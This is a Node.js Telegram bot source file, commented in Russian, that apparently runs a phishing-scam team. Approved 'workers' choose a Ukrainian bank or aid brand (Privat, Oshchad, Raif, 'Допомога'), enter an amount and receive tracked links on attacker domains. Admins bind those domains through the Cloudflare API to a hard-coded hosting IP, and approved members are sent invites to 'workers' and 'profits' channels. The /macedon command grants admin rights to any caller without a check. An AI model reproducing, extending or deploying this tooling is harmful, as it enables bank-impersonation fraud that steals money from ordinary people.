require('dotenv').config({ quiet: true });
const { Telegraf } = require('telegraf');
const fs = require('fs');
const crypto = require('crypto');
const Cloudflare = require('cloudflare');

/* ==========================
   0) Проверка переменных окружения
========================== */
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID ? String(process.env.ADMIN_CHAT_ID) : null;
const CLOUDFLARE_API_TOKEN = process.env.CLOUDFLARE_API_TOKEN;
const CLOUDFLARE_ACCOUNT_ID = process.env.CLOUDFLARE_ACCOUNT_ID;

if (!BOT_TOKEN) {
  console.error('❌ BOT_TOKEN не указан в .env');
  process.exit(1);
}
if (!CLOUDFLARE_API_TOKEN) {
  console.error('❌ CLOUDFLARE_API_TOKEN не указан в .env');
  process.exit(1);
}
if (!CLOUDFLARE_ACCOUNT_ID) {
  console.error('❌ CLOUDFLARE_ACCOUNT_ID не указан в .env');
  process.exit(1);
}

/* ==========================
   1) Инициализация бота и Cloudflare
========================== */
const bot = new Telegraf(BOT_TOKEN);
const cf = new Cloudflare({ token: CLOUDFLARE_API_TOKEN });

/* ==========================
   2) Работа с файлами
========================== */
const applicationsFile = 'applications.json';

const readJsonSafe = (path, fallback) => {
  if (!fs.existsSync(path)) return fallback;
  try {
    return JSON.parse(fs.readFileSync(path, 'utf8'));
  } catch (e) {
    console.error(`Ошибка чтения ${path}:`, e.message);
    return fallback;
  }
};

const writeJsonSafe = (path, data) => {
  try {
    const currentData = JSON.stringify(data);
    const existingData = fs.existsSync(path) ? fs.readFileSync(path, 'utf8') : '{}';
    if (currentData !== existingData) {
      fs.writeFileSync(path, JSON.stringify(data, null, 2));
      console.log(`Файл ${path} успешно сохранен`);
    } else {
      console.log(`Файл ${path} не изменен, пропуск записи`);
    }
  } catch (e) {
    console.error(`Ошибка сохранения ${path}:`, e.message, e.stack);
  }
};

let applications = readJsonSafe(applicationsFile, {});

/* ==========================
   3) Админы: Проверка и управление
========================== */
const isAdminId = (id) => applications[id]?.admin === true;

const requireAdmin = (ctx) => {
  if (!isAdminId(ctx.from.id)) {
    ctx.reply('У вас нет прав. Только администраторы могут использовать эту команду.');
    return false;
  }
  return true;
};

/* Защита от дублирующих callback-ов */
const callbackCache = new Map();
const addToCallbackCache = (key) => {
  const now = Date.now();
  if (callbackCache.has(key)) {
    const timestamp = callbackCache.get(key);
    if (now - timestamp < 5000) {
      console.log(`Пропущен дублирующий callback: ${key}`);
      return false;
    }
  }
  callbackCache.set(key, now);
  setTimeout(() => callbackCache.delete(key), 5000);
  return true;
};

/* Функция для создания клавиатуры админов */
const buildAdminKeyboard = () => {
  const buttons = Object.entries(applications)
    .filter(([id, data]) => id !== 'admins' && id !== 'domains' && data?.username)
    .map(([id, data]) => {
      const isAdmin = data.admin === true;
      const marker = isAdmin ? '✅' : '❌';
      return [{ text: `${marker} @${data.username} (${id})`, callback_data: `toggle_admin_${id}` }];
    });
  return buttons.length ? buttons : [[{ text: 'Нет пользователей', callback_data: 'noop' }]];
};

/* ==========================
   4) Сервисные ссылки и генератор
========================== */
const serviceLinks = {
  'Допомога': 'https://t.me/dopomoga_group',
  'Райф': 'https://t.me/raif_group',
  'Ощад': 'https://t.me/oshchad_group',
  'Приват': 'https://t.me/privat_group',
  'Вайбер': 'https://t.me/viber_group',
};

const generateLink = (service, amount, userId) => {
  const userDomain = Object.entries(applications.domains || {})
    .find(([_, data]) => data.ownerId === String(userId) && data.active && data.verified)?.[0];
  const baseUrl = userDomain ? `https://${userDomain}` : (serviceLinks[service] || 'https://t.me/fallback_group');
  const id = crypto.randomUUID();
  const url = `${baseUrl}?amount=${amount}&id=${id}`;
  if (!url.startsWith('https://')) {
    console.error(`Ошибка: некорректный URL для сервиса ${service} или домена ${userDomain}: ${url}`);
    return 'https://t.me/fallback_group';
  }
  console.log(`Сгенерирована ссылка для ${userId}: ${url}`);
  return url;
};

const saveApplications = () => writeJsonSafe(applicationsFile, applications);

/* ==========================
   5) Хранилище состояний
========================== */
const userState = {};
const domainState = {};

/* ==========================
   6) Общие хелперы
========================== */
const showServices = (ctx) => {
  console.log(`Показ списка сервисов для ${ctx.from.id}`);
  ctx.reply('Выберите сервис:', {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '1 - Допомога', callback_data: 'service_dopomoga' },
          { text: '2 - Райф', callback_data: 'service_raif' },
        ],
        [
          { text: '3 - Ощад', callback_data: 'service_oshchad' },
          { text: '4 - Приват', callback_data: 'service_privat' },
        ],
        [{ text: '5 - Вайбер', callback_data: 'service_viber' }],
      ],
    },
  });
};

/* ==========================
   7) Обработка ошибок Telegram API
========================== */
const retryRequest = async (fn, maxRetries = 3, baseDelay = 1000) => {
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      if (error.code === 429 && error.response?.parameters?.retry_after) {
        const retryAfter = error.response.parameters.retry_after * 1000;
        console.log(`[retryRequest] Ошибка 429, ждем ${retryAfter} мс перед попыткой ${attempt + 1}`);
        await new Promise((resolve) => setTimeout(resolve, retryAfter));
        continue;
      }
      console.error(`[retryRequest] Ошибка: ${error.message}, попытка ${attempt}`);
      if (attempt === maxRetries) throw error;
      await new Promise((resolve) => setTimeout(resolve, baseDelay * attempt));
    }
  }
  throw new Error(`Не удалось выполнить запрос после ${maxRetries} попыток`);
};


/* ==========================
   Функция: лог DNS-записей
========================== */
async function logDnsRecords(zoneId, domain, ctx) {
  try {
    const records = await cf.dnsRecords.browse(zoneId);
    if (!records || !records.result) {
      await ctx.reply(`⚠️ Не удалось получить DNS-записи для ${domain}`);
      return;
    }
    let out = `📜 DNS-записи для ${domain}:
`;
    for (const r of records.result) {
      out += `• ${r.type} ${r.name} → ${r.content} (TTL ${r.ttl})
`;
    }
    await ctx.reply(out);
  } catch (e) {
    console.error("Ошибка чтения DNS:", e.message);
    await ctx.reply(`Ошибка получения DNS-записей: ${e.message}`);
  }
}


/* ==========================
   8) Создание заявки из текста
========================== */
const handleTextMessage = async (ctx) => {
  const userId = ctx.from.id;
  const username = ctx.from.username || 'Нет имени';
  const firstName = ctx.from.first_name || '';
  const lastName = ctx.from.last_name || '';
  const message = ctx.message.text;

  console.log(`Получено сообщение от ${userId} (@${username}): ${message}`);

  if (domainState[userId]?.awaitingDomain) {
    const domain = message.trim().toLowerCase();
    // Регулярное выражение для поддержки .biz.ua и других двухуровневых доменов
    if (!/^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9](?:\.[a-zA-Z]{2,})+$/.test(domain)) {
      await retryRequest(() =>
        ctx.reply('Некорректный домен. Введите домен в формате example.com или pburarai.biz.ua:', {
          reply_markup: { inline_keyboard: [[{ text: 'Отмена', callback_data: 'cancel_bind_domain' }]] },
        })
      );
      console.log(`Некорректный домен от ${userId}: ${domain}`);
      return;
    }

    // Проверка существования домена в applications.json
    if (applications.domains?.[domain]) {
      await retryRequest(() =>
        ctx.reply(`Домен ${domain} уже зарегистрирован пользователем @${applications.domains[domain].ownerUsername || 'Неизвестно'}.`)
      );
      console.log(`Домен ${domain} уже существует в applications.json, владелец: ${applications.domains[domain].ownerId}`);
      delete domainState[userId];
      return;
    }

    // Проверка существования домена в Cloudflare
    let zoneId;
    try {
      const zones = await cf.zones.list();
      const existingZone = zones.result.find(z => z.name === domain);
      if (existingZone) {
        zoneId = existingZone.id;
        await retryRequest(() =>
          ctx.reply(
            `Домен ${domain} уже существует в Cloudflare (zoneId: ${zoneId}).\n` +
            `Хотите использовать его?`, {
              reply_markup: {
                inline_keyboard: [
                  [{ text: 'Да', callback_data: `use_existing_zone_${domain}_${zoneId}` }],
                  [{ text: 'Нет, выбрать другой', callback_data: 'cancel_bind_domain' }],
                ],
              },
            }
          )
        );
        domainState[userId] = { domain, zoneId, nameservers: existingZone.name_servers };
        return;
      }
    } catch (error) {
      console.error(`Ошибка проверки существования домена ${domain}:`, error.message);
    }

    // Создание новой зоны, если домен не существует
    try {
      const zone = await cf.zones.create({ name: domain, account: { id: CLOUDFLARE_ACCOUNT_ID } });
      zoneId = zone.result.id;
      const nameservers = zone.result.name_servers;

      // IP-адрес для A-записей (IP хостинга Beget)
      const ipAddress = '45.130.41.157'; // Укажите ваш IP хостинга здесь

      // Создание A-записей
      await cf.dnsRecords.create(zoneId, {
        type: 'A',
        name: 'www.' + domain,
        content: ipAddress,
        ttl: 3600,
        proxied: true,
      });
      await cf.dnsRecords.create(zoneId, {
        type: 'A',
        name: domain,
        content: ipAddress,
        ttl: 3600,
        proxied: true,
      });
      await cf.dnsRecords.create(zoneId, {
        type: 'A',
        name: '*.' + domain,
        content: ipAddress,
        ttl: 3600,
        proxied: true,
      });
      console.log(`A-записи для ${domain} добавлены: www, @, *`);

      domainState[userId] = { domain, zoneId, nameservers, ipAddress };
      await retryRequest(() =>
        ctx.reply(
          `Домен ${domain} добавлен в Cloudflare!\n\n` +
          `Добавьте следующие NS-записи у вашего регистратора домена:\n` +
          nameservers.map((ns, i) => `${i + 1}. ${ns}`).join('\n') +
          `\n\nA-записи настроены на IP: ${ipAddress}.\n` +
          `После настройки NS-записей (может занять до 24 часов) нажмите "Проверить".`,
          {
            reply_markup: {
              inline_keyboard: [[{ text: 'Проверить', callback_data: `verify_domain_${domain}` }]],
            },
          }
        )
      );
      console.log(`Домен ${domain} добавлен в Cloudflare, zoneId: ${zoneId}, NS: ${nameservers.join(', ')}`);
    } catch (error) {
  console.error(`Ошибка добавления домена ${domain} в Cloudflare:`, error.message, error.stack);

  // Если домен уже существует (код 1061), предложим использовать существующую зону
  const msg = (typeof error === 'object' && error !== null && error.message) ? error.message : String(error);
  if (msg.includes("1061") || msg.includes("already exists")) {
    await ctx.reply(
      `Домен ${domain} уже есть в Cloudflare. Использовать его?`,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'Да', callback_data: `use_existing_zone_${domain}_manual` }],
            [{ text: 'Нет, выбрать другой', callback_data: 'cancel_bind_domain' }],
          ],
        },
      }
    );
    return;
  }

  await retryRequest(() =>
    ctx.reply(
      `Ошибка добавления домена ${domain} в Cloudflare. ${msg.includes('already exists') ? 'Домен уже существует, удалите его в Cloudflare Dashboard или выберите другой.' : 'Проверьте IP сервера или API-токен.'}`,
      { reply_markup: { inline_keyboard: [[{ text: 'Отмена', callback_data: 'cancel_bind_domain' }]] } }
    )
  );
}
return;
  }

  if (applications[userId] && applications[userId].status !== 'rejected') {
    return ctx.reply('Вы уже подали заявку. Дождитесь решения.');
  }

  applications[userId] = {
    status: 'pending',
    username,
    firstName,
    lastName,
    message,
    timestamp: new Date().toISOString(),
    messageId: null,
    links: [],
  };

  if (!ADMIN_CHAT_ID) {
    console.error('ADMIN_CHAT_ID не указан в .env — некуда отправлять заявки');
    saveApplications();
    return ctx.reply('Заявка принята локально, но админ-чат не настроен. Свяжитесь с админом.');
  }

  try {
    const sentMessage = await retryRequest(() =>
      bot.telegram.sendMessage(
        ADMIN_CHAT_ID,
        `Новая заявка от @${username} (${firstName} ${lastName}):\n${message}`,
        {
          reply_markup: {
            inline_keyboard: [
              [
                { text: 'Добавить', callback_data: `approve_${userId}` },
                { text: 'Отклонить', callback_data: `reject_${userId}` },
              ],
            ],
          },
        }
      )
    );
    applications[userId].messageId = sentMessage.message_id;
    console.log(
      `Заявка от ${userId} отправлена в админ-чат, messageId: ${sentMessage.message_id}, adminChatId: ${ADMIN_CHAT_ID}`
    );
    saveApplications();
    await ctx.reply('Ваша заявка отправлена на рассмотрение.');
  } catch (error) {
    console.error('Ошибка отправки в админ-чат:', error.message, error.stack);
    await ctx.reply('Ошибка отправки заявки. Попробуйте позже.');
  }
};

/* ==========================
   9) Команды
========================== */
bot.start((ctx) => {
  const userId = ctx.from.id;
  console.log(`Команда /start от ${userId}`);

  if (applications[userId] && applications[userId].status === 'approved') {
    ctx.reply('Добро пожаловать! Выберите действие:', {
      reply_markup: {
        keyboard: [[{ text: 'Выбрать сервис' }, { text: 'Мои ссылки' }]],
        resize_keyboard: true,
        one_time_keyboard: false,
      },
    });
  } else if (applications[userId] && applications[userId].status === 'pending') {
    ctx.reply('Ваша заявка на рассмотрении. Дождитесь решения.');
  } else {
    ctx.reply('Расскажите о себе:');
  }
});

bot.command('test', async (ctx) => {
  const userId = ctx.from.id;
  const chatId = ctx.chat?.id;
  console.log(`Команда /test от ${userId}, chatId: ${chatId}`);

  try {
    await ctx.reply('Тест: бот работает!');

    if (!ADMIN_CHAT_ID) {
      return ctx.reply('ADMIN_CHAT_ID не указан в .env, пропускаю отправку в админ-чат.');
    }

    const testMessage = await retryRequest(() =>
      bot.telegram.sendMessage(
        ADMIN_CHAT_ID,
        `Тестовое сообщение от @${ctx.from.username || 'Админ'}`,
        { reply_markup: { inline_keyboard: [[{ text: 'Тестовая кнопка', callback_data: 'test_button' }]] } }
      )
    );
    console.log(`Тестовое сообщение отправлено в админ-чат, messageId: ${testMessage.message_id}, adminChatId: ${ADMIN_CHAT_ID}`);
  } catch (error) {
    console.error('Ошибка команды /test:', error.message, error.stack);
    await ctx.reply('Ошибка при тестировании. Проверьте логи.');
  }
});

bot.command('macedon', async (ctx) => {
  const userId = ctx.from.id;
  const parts = ctx.message.text.split(/\s+|=/).filter(Boolean);
  const targetId = Number(parts[1]);
  if (Number.isNaN(targetId)) {
    return ctx.reply('Укажите корректный ID пользователя. Пример: /macedon 123456789');
  }

  if (!applications[targetId]) {
    return ctx.reply(`Пользователь с ID ${targetId} не найден в заявках.`);
  }

  if (applications[targetId].admin === true) {
    return ctx.reply(`Пользователь ${applications[targetId]?.username ? `@${applications[targetId].username}` : targetId} уже администратор.`);
  }

  applications[targetId].admin = true;
  saveApplications();
  const uname = applications[targetId]?.username ? `@${applications[targetId].username}` : targetId;
  await ctx.reply(`Пользователь ${uname} (${targetId}) назначен администратором.`);
  console.log(`[macedon] Админ добавлен: ${targetId} (${uname}) by ${userId}`);
});

bot.command('admin', async (ctx) => {
  if (!requireAdmin(ctx)) return;
  await retryRequest(() =>
    ctx.reply('Выберите действие:', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'Добавить домен', callback_data: 'bind_domain' },
            { text: 'Администраторы', callback_data: 'manage_admins' },
          ],
        ],
      },
    })
  );
});

/* ==========================
   10) Callback-кнопки
========================== */
bot.on('callback_query', async (ctx) => {
  const userId = ctx.from.id;
  const callbackData = ctx.callbackQuery.data;
  const messageId = ctx.callbackQuery.message?.message_id;
  const chatId = ctx.chat?.id;
  console.log(`Callback от ${userId}, callbackData: ${callbackData}, messageId: ${messageId}, chatId: ${chatId}`);

  try {
    if (callbackData === 'test_button') {
      console.log(`Тестовая кнопка нажата пользователем ${userId}`);
      await ctx.answerCbQuery('Тестовая кнопка работает!');
      return;
    }

    if (callbackData === 'noop') {
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData === 'bind_domain') {
      if (!isAdminId(userId)) {
        await ctx.answerCbQuery('Нет прав.');
        return;
      }
      domainState[userId] = { awaitingDomain: true };
      await retryRequest(() =>
        ctx.reply('Введите домен (например, example.com или pburarai.biz.ua):', {
          reply_markup: {
            inline_keyboard: [[{ text: 'Отмена', callback_data: 'cancel_bind_domain' }]],
          },
        })
      );
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData === 'cancel_bind_domain') {
      delete domainState[userId];
      await ctx.reply('Привязка домена отменена.');
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData.startsWith('verify_domain_')) {
      const domain = callbackData.replace('verify_domain_', '');
      if (!isAdminId(userId) || !domainState[userId]?.zoneId) {
        await ctx.answerCbQuery('Ошибка: некорректный запрос.');
        return;
      }

      const { zoneId, nameservers } = domainState[userId];
      const ipAddress = domainState[userId]?.ipAddress || '45.130.41.157';
      console.log(`Проверка статуса зоны для ${domain}, zoneId: ${zoneId}`);

      try {
        const zone = await cf.zones.read(zoneId);
        if (zone.result.status !== 'active') {
          await retryRequest(() =>
            ctx.reply(`Домен ${domain} еще не активен в Cloudflare. Проверьте, что NS-записи настроены у регистратора:\n` +
              nameservers.map((ns, i) => `${i + 1}. ${ns}`).join('\n') +
              `\n\nПопробуйте снова через 5-10 минут.`, {
              reply_markup: {
                inline_keyboard: [[{ text: 'Проверить снова', callback_data: `verify_domain_${domain}` }]],
              },
            })
          );
          console.log(`Домен ${domain} не активен, статус: ${zone.result.status}`);
          return;
        }

        applications.domains = applications.domains || {};
        applications.domains[domain] = {
          ownerId: String(userId),
          ownerUsername: ctx.from.username || 'Нет имени',
          addedAt: new Date().toISOString(),
          active: true,
          verified: true,
          nameservers,
        };
        saveApplications();

        // Лог всех DNS-записей зоны
        await logDnsRecords(zoneId, domain, ctx);

        await retryRequest(() =>
          ctx.reply(
            `Домен ${domain} успешно привязан!\n\n` +
            `A-записи настроены на IP: ${ipAddress}.\n` +
            `NS-записи:\n` +
            nameservers.map((ns, i) => `${i + 1}. ${ns}`).join('\n') +
            `\n\nДомен готов к использованию в ссылках.`
          )
        );
        console.log(`Домен ${domain} успешно привязан пользователем ${userId}`);
        delete domainState[userId];
        await ctx.answerCbQuery();
      } catch (error) {
        console.error(`Ошибка при привязке домена ${domain}:`, error.message);
        await retryRequest(() =>
          ctx.reply(`Ошибка при привязке домена ${domain}. Проверьте настройки DNS или API-токен.`, {
            reply_markup: {
              inline_keyboard: [[{ text: 'Проверить снова', callback_data: `verify_domain_${domain}` }]],
            },
          })
        );
      }
      return;
    }

    
if (callbackData.startsWith('use_existing_zone_') && callbackData.endsWith('_manual')) {
  const domain = callbackData.replace('use_existing_zone_', '').replace('_manual','');
  if (!isAdminId(userId)) {
    await ctx.answerCbQuery('Нет прав.');
    return;
  }
  // Ищем зону по имени
  const zones = await cf.zones.list({ name: domain });
  if (!zones.result || !zones.result.length) {
    await ctx.reply(`⚠️ Не удалось найти зону для ${domain}`);
    return;
  }
  const zoneId = zones.result[0].id;
  const nameservers = zones.result[0].name_servers;
  domainState[userId] = { domain, zoneId, nameservers, ipAddress: '45.130.41.157' };

  const ipAddress = '45.130.41.157'; // IP хостинга Beget
  try {
    for (const name of ['@', 'www', '*']) {
      await cf.dnsRecords.create(zoneId, {
        type: 'A',
        name: name === '@' ? domain : `${name}.${domain}`,
        content: ipAddress,
        ttl: 3600,
        proxied: true,
      });
    }
    console.log(`A-записи для ${domain} добавлены в существующую зону (manual)`);
  } catch (error) {
    console.error(`Ошибка добавления A-записей (manual) для ${domain}:`, error.message);
  }

  await retryRequest(() =>
    ctx.reply(
      `Домен ${domain} привязан к существующей зоне!\n\n` +
      `Добавьте следующие NS-записи у вашего регистратора домена:\n` +
      nameservers.map((ns, i) => `${i + 1}. ${ns}`).join('\n') +
      `\n\nA-записи настроены на IP: ${ipAddress}.\n` +
      `После настройки NS-записей (может занять до 24 часов) нажмите "Проверить".`,
      { reply_markup: { inline_keyboard: [[{ text: 'Проверить', callback_data: `verify_domain_${domain}` }]] } }
    )
  );
  await ctx.answerCbQuery();
  return;
}

    if (callbackData.startsWith('use_existing_zone_')) {
      const [domain, zoneId] = callbackData.replace('use_existing_zone_', '').split('_');
      if (!isAdminId(userId)) {
        await ctx.answerCbQuery('Нет прав.');
        return;
      }

      const nameservers = (await cf.zones.read(zoneId)).result.name_servers;
      domainState[userId] = { domain, zoneId, nameservers, ipAddress };

      // Проверка и настройка A-записей для существующей зоны
      const ipAddress = '45.130.41.157'; // IP хостинга Beget
      try {
        await cf.dnsRecords.create(zoneId, {
          type: 'A',
          name: 'www.' + domain,
          content: ipAddress,
          ttl: 3600,
          proxied: true,
        });
        await cf.dnsRecords.create(zoneId, {
          type: 'A',
          name: domain,
          content: ipAddress,
          ttl: 3600,
          proxied: true,
        });
        await cf.dnsRecords.create(zoneId, {
          type: 'A',
          name: '*.' + domain,
          content: ipAddress,
          ttl: 3600,
          proxied: true,
        });
        console.log(`A-записи для ${domain} добавлены в существующую зону`);
      } catch (error) {
        console.error(`Ошибка добавления A-записей для ${domain}:`, error.message);
      }

      await retryRequest(() =>
        ctx.reply(
          `Домен ${domain} привязан к существующей зоне!\n\n` +
          `Добавьте следующие NS-записи у вашего регистратора домена:\n` +
          nameservers.map((ns, i) => `${i + 1}. ${ns}`).join('\n') +
          `\n\nA-записи настроены на IP: ${ipAddress}.\n` +
          `После настройки NS-записей (может занять до 24 часов) нажмите "Проверить".`,
          {
            reply_markup: {
              inline_keyboard: [[{ text: 'Проверить', callback_data: `verify_domain_${domain}` }]],
            },
          }
        )
      );
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData === 'manage_admins') {
      if (!isAdminId(userId)) {
        await ctx.answerCbQuery('Нет прав.');
        return;
      }
      const userButtons = buildAdminKeyboard();
      await retryRequest(() =>
        ctx.reply('Управление администраторами:', {
          reply_markup: { inline_keyboard: userButtons },
        })
      );
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData.startsWith('toggle_admin_')) {
      if (!isAdminId(userId)) {
        await ctx.answerCbQuery('Нет прав.');
        return;
      }

      const targetId = Number(callbackData.replace('toggle_admin_', ''));
      if (!applications[targetId]) {
        await ctx.answerCbQuery('Пользователь не найден в заявках.');
        return;
      }

      const uniqueToken = crypto.randomBytes(8).toString('hex');
      const callbackKey = `${chatId}_${messageId}_${targetId}_${uniqueToken}`;
      console.log(`[toggle_admin] Обработка callback: ${callbackKey}`);
      if (!addToCallbackCache(callbackKey)) {
        console.log(`[toggle_admin] Дубликат отклонён: ${callbackKey}`);
        await ctx.answerCbQuery('Действие уже выполняется, подождите.');
        return;
      }

      const isCurrentlyAdmin = applications[targetId].admin === true;
      applications[targetId].admin = !isCurrentlyAdmin;
      saveApplications();

      const userButtons = buildAdminKeyboard();
      try {
        await retryRequest(() =>
          ctx.editMessageText('Управление администраторами:', {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: { inline_keyboard: userButtons },
          })
        );
        console.log(`[toggle_admin] Клавиатура обновлена для ${targetId}, admin: ${applications[targetId].admin}`);
      } catch (error) {
        console.error(`[toggle_admin] Ошибка обновления сообщения для ${targetId}:`, error.message);
        await retryRequest(() =>
          ctx.reply('Управление администраторами:', {
            reply_markup: { inline_keyboard: userButtons },
          })
        );
        console.log(`[toggle_admin] Отправлено новое сообщение для ${targetId}`);
      }

      const uname = applications[targetId]?.username ? `@${applications[targetId].username}` : targetId;
      console.log(`[toggle_admin] Статус админа для ${uname} (${targetId}) изменён. Admin: ${applications[targetId].admin}, by ${userId}`);
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_')) {
      if (!isAdminId(userId)) {
        await ctx.answerCbQuery('Нет прав.');
        return;
      }

      const [action, targetUserId] = callbackData.split('_');
      const adminChatId = ADMIN_CHAT_ID;
      const adminUsername = ctx.from.username || 'Админ';

      console.log(`Обработка ${action} для userId: ${targetUserId}, adminChatId: ${adminChatId}, messageId: ${messageId}`);

      if (!adminChatId) {
        console.error('ADMIN_CHAT_ID не указан в .env');
        await ctx.answerCbQuery('Ошибка: ADMIN_CHAT_ID не настроен.');
        return;
      }

      if (!applications[targetUserId]) {
        console.log(`Заявка для ${targetUserId} не найдена в applications`);
        await ctx.answerCbQuery('Заявка не найдена.');
        return;
      }

      if (!applications[targetUserId].messageId) {
        console.log(`messageId для ${targetUserId} отсутствует в applications`);
        await ctx.answerCbQuery('Ошибка: сообщение заявки не найдено.');
        return;
      }

      const originalText =
        `Новая заявка от @${applications[targetUserId].username} ` +
        `(${applications[targetUserId].firstName} ${applications[targetUserId].lastName}):\n` +
        `${applications[targetUserId].message}`;

      let buttonText;

      console.log(`Попытка выполнить ${action} для ${targetUserId}`);

      if (action === 'approve') {
        applications[targetUserId].status = 'approved';
        buttonText = `Одобрил - @${adminUsername}`;
        try {
          await retryRequest(() =>
            bot.telegram.sendMessage(Number(targetUserId), 'Ваша заявка одобрена!', {
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: 'Воркеры', url: 'https://t.me/+neejzwlpAbo1MjZi' },
                    { text: 'Профиты', url: 'https://t.me/+o9Kpn9RDIMExOWNi' },
                  ],
                ],
              },
            })
          );
          console.log(`Заявка ${targetUserId} одобрена, уведомление отправлено`);
        } catch (error) {
          console.error(`Ошибка отправки уведомления ${targetUserId}:`, error.message, error.stack);
          await ctx.answerCbQuery('Ошибка отправки уведомления пользователю.');
          return;
        }
      } else if (action === 'reject') {
        applications[targetUserId].status = 'rejected';
        buttonText = `Отклонил - @${adminUsername}`;
        try {
          await retryRequest(() =>
            bot.telegram.sendMessage(Number(targetUserId), 'Ваша заявка отклонена.')
          );
          console.log(`Заявка ${targetUserId} отклонена, уведомление отправлено`);
        } catch (error) {
          console.error(`Ошибка отправки уведомления ${targetUserId}:`, error.message, error.stack);
          await ctx.answerCbQuery('Ошибка отправки уведомления пользователю.');
          return;
        }
      }

      try {
        await retryRequest(() =>
          bot.telegram.editMessageText(adminChatId, applications[targetUserId].messageId, undefined, originalText, {
            reply_markup: {
              inline_keyboard: [[{ text: buttonText, callback_data: 'noop' }]],
            },
          })
        );
        console.log(`Сообщение в админ-чате обновлено для ${targetUserId}, action: ${action}`);
      } catch (error) {
        console.error(`Ошибка обновления сообщения в админ-чате для ${targetUserId}:`, error.message, error.stack);
        await ctx.answerCbQuery('Ошибка обновления сообщения в админ-чате.');
      }

      saveApplications();
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData.startsWith('service_')) {
      const serviceMap = {
        'service_dopomoga': 'Допомога',
        'service_raif': 'Райф',
        'service_oshchad': 'Ощад',
        'service_privat': 'Приват',
        'service_viber': 'Вайбер',
      };
      const serviceKey = callbackData;
      const service = serviceMap[serviceKey];

      if (!service) {
        console.error(`Неизвестный сервис: ${serviceKey}`);
        await ctx.answerCbQuery('Ошибка: сервис не найден.');
        return;
      }

      userState[userId] = { awaitingAmount: true, service };
      await retryRequest(() =>
        ctx.reply('Введите сумму:', {
          reply_markup: {
            inline_keyboard: [[{ text: 'Отмена', callback_data: 'cancel_amount' }]],
          },
        })
      );
      await ctx.answerCbQuery();
      return;
    }

    if (callbackData === 'cancel_amount') {
      delete userState[userId];
      await ctx.reply('Ввод суммы отменен.');
      await ctx.answerCbQuery();
      return;
    }

  } catch (error) {
    console.error(`Ошибка обработки callback ${callbackData}:`, error.message, error.stack);
    await ctx.answerCbQuery('Произошла ошибка. Попробуйте снова.');
  }
});

/* ==========================
   11) Обработка ввода суммы
========================== */
bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  const messageText = ctx.message.text;

  if (userState[userId]?.awaitingAmount) {
    const amount = parseFloat(messageText);
    if (isNaN(amount) || amount <= 0) {
      await retryRequest(() =>
        ctx.reply('Пожалуйста, введите корректную сумму (положительное число).', {
          reply_markup: {
            inline_keyboard: [[{ text: 'Отмена', callback_data: 'cancel_amount' }]],
          },
        })
      );
      console.log(`Некорректная сумма от ${userId}: ${messageText}`);
      return;
    }

    const { service } = userState[userId];
    const link = generateLink(service, amount, userId);

    applications[userId] = applications[userId] || {};
    applications[userId].links = applications[userId].links || [];
    applications[userId].links.push({ service, amount, link, timestamp: new Date().toISOString() });
    saveApplications();

    await retryRequest(() => ctx.reply(`Ваша ссылка: ${link}`));
    console.log(`Ссылка создана для ${userId}: ${link}`);
    delete userState[userId];
    return;
  }

  await handleTextMessage(ctx);
});

/* ==========================
   12) Обработка команды "Мои ссылки"
========================== */
bot.hears('Мои ссылки', async (ctx) => {
  const userId = ctx.from.id;
  if (!applications[userId] || applications[userId].status !== 'approved') {
    return ctx.reply('У вас нет одобренных заявок или ссылок.');
  }

  const links = applications[userId].links || [];
  if (!links.length) {
    return ctx.reply('У вас пока нет ссылок.');
  }

  const linksText = links
    .map((link, index) => `${index + 1}. ${link.service} - ${link.amount} - ${link.link} (${link.timestamp})`)
    .join('\n');
  await ctx.reply(`Ваши ссылки:\n${linksText}`);
});

/* ==========================
   13) Обработка команды "Выбрать сервис"
========================== */
bot.hears('Выбрать сервис', async (ctx) => {
  const userId = ctx.from.id;
  if (!applications[userId] || applications[userId].status !== 'approved') {
    return ctx.reply('Ваша заявка не одобрена. Отправьте заявку через /start.');
  }
  showServices(ctx);
});

/* ==========================
   14) Запуск бота
========================== */
bot.launch().then(() => {
  console.log('Бот запущен');
}).catch((error) => {
  console.error('Ошибка запуска бота:', error.message, error.stack);
});

// Обработка остановки
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));